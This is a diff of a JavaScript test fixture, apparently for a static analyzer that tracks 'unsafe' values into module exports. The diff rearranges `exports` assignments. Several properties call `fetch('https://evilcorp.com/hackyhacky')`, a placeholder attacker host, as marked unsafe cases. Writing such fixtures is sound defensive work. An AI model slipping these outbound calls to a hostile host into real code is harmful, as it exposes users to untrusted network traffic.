@@ -38,14 +38,14 @@ sim_010 = sim_002;                                           // re-assigned to u
 const sim_011 = sim_001;                                     // declared with safe identifier
 const sim_012 = sim_011;                                     // declared with identifier referencing an identifier
 
+exports = sim_001;
+
 // Object cases
 // obj = object
 const obj_001 = { a: 'A safe string' };                                                                                                          // all properties safe
-exports = { obj_001 };
 const obj_002 = { a: fetch('https://evilcorp.com/hackyhacky') }                                                                            // unsafe property
 const obj_003 = { a: 'A safe string', b: 'A safe string2' };                                                                                     // all properties safe
 const obj_004 = { a: fetch('https://evilcorp.com/hackyhacky'), b: 'A safe string' };                                                       // unsafe property
-exports = { obj_004 };
 const obj_005 = { a: 'A safe string', b: 'A safe string', c: 'A safe string', d: fetch('https://evilcorp.com/hackyhacky') };               // unsafe property
 const obj_006 = { c: sim_001, d: 'A safe string3' };                                                                                             // all properties safe
 const obj_007 = { a: sim_002, b: 'A safe string' };                                                                                              // unsafe property from variable
@@ -60,6 +60,11 @@ const obj_013 = { a: 'A safe string', b: null };                                
 let obj_015 = { a: 'A safe string', b: 'A safe string2' };                                                                                       // all properties safe
 obj_015 = { a: fetch('https://evilcorp.com/hackyhacky'), b: 'A safe string' };                                                             // reassigned to unsafe
 const obj_014 = obj_015;                                                                                                                         // references unsafe
+
+exports = { obj_001 };
+exports = { obj_004 };
+exports = { obj_003, obj_005 };
+exports = obj_011;
 
 // String manipulation, template strings, concatenations
 // str = string
